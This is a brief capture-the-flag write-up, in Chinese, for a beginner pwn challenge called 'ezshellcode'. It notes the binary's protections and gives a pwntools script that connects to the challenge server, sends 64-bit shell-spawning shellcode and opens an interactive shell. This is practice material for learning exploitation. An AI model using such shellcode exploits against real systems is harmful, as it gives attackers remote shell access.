# W1 ezshellcode

## 文件分析

下载`ezshellcode`, NX on, PIE off, Canary off, RELRO partial  
ghidra分析为64位程序

## 解题思路

输入一段shellcode就会直接运行了，发一段64位sh的shellcode即可

## EXPLOIT

```python
from pwn import *
sh = remote("node4.buuoj.cn", 27766)
shc = asm(shellcraft.amd64.linux.sh(), arch='amd64')
sh.sendline(shc)
sh.interactive()
```

Done.
